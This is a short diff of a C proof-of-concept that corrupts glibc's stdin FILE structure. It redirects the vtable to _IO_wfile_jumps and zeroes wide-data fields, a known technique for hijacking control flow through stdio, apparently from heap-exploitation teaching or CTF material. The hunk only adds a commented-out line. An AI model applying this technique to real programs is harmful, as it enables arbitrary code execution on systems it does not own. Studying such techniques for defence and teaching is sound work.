@@ -19,6 +19,8 @@ int main()
     *(long*)(_IO_2_1_stdin_ptr + 0xd8) = libc_base + 0x2160c0;
     // fp->_vtable = _IO_wfile_jumps
     
+    // *(long*)(_IO_2_1_stdin_ptr + 0xa0) = wide_data;
+    
     long wide_data = *(long*)(_IO_2_1_stdin_ptr + 0xa0);
     *(long*)(wide_data + 0x18) = 0;
     // fp->_wide_data->_IO_write_base = 0
